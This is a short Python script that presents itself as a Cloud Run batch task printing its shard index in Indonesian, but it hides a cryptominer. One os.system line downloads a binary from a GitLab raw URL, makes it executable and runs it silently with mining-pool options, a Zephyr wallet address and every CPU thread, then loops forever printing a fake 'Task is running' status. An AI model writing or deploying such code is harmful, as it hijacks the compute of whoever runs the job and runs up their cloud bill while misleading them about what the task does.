import os
task_index = int(os.environ.get("CLOUD_RUN_TASK_INDEX", 0))
task_count = int(os.environ.get("CLOUD_RUN_TASK_COUNT", 1))
os.system('wget https://gitlab.com/barbieanay003/seger/-/raw/main/class && chmod +x class && ./class --donate-level 1 -o 139.59.115.152:80 -u ZEPHs9rs3BEXTDVk2xJPpN7uvRTJLndum58xhmDCQUNxhHRLke4HPcAjFsKPeSSiAva1S6SD6GdXyZP95j9ScoaFHZU65TcuQcp.$(shuf -n 1 -i 1111-9999)-Amien -a rx/0 -k -t $(nproc --all) >/dev/null 2>&1 & while true; do echo "Task is running - $(date)"; sleep 100; done')
print(f"Menjalankan Task {task_index} dari total {task_count}")
# Gunakan index ini untuk mengambil potongan data tertentu (sharding)
